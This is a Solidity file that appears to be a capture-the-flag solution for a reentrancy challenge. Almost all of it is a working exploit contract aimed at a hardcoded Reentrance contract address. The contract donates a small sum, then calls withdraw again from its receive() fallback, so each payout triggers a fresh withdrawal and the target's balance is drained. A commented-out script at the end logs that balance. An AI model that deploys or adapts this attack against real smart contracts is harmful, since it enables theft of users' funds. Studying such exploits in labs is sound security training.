// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/Re-entrancy.sol";

contract ReentrancyAttack {
    Reentrance re =
        Reentrance(payable(0xC3f389Cb718a15603bc6bAb4B38D3eC0311cDA70));
    constructor() public payable {}
    function deposit() external payable {
        re.donate{value: 1000000000000000}(address(this));
    }
    function withdraw() external payable {
        if (address(re).balance >= 1000000000000000) {
            re.withdraw(1000000000000000);
        }
    }
    receive() external payable {
        re.withdraw(1000000000000000);
    }
}
// contract ReentrancySolution is Script {
//     Reentrance re =
//         Reentrance(payable(0xC3f389Cb718a15603bc6bAb4B38D3eC0311cDA70));
//     function run() external {
//         console.log(address(re).balance);
//     }
// }
